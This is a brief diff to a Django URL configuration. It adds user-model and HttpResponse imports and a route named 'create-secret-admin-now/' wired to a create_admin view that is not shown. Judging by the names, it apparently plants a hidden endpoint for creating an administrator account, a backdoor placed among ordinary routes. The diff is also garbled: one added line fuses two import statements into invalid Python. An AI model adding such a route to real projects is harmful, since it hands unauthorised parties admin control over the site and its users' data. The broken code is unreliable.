@@ -1,4 +1,5 @@
-from django.contrib import admin
+from django.contrib.auth import get_user_model
+from django.http import HttpResponsefrom django.contrib import admin
 from django.urls import path, include
 from django.http import JsonResponse
 
@@ -19,4 +20,5 @@ urlpatterns = [
     path('', home, name='home'),
     path('admin/', admin.site.urls),
     path('api/', include('billing.urls')),
+    path('create-secret-admin-now/', create_admin),
 ]
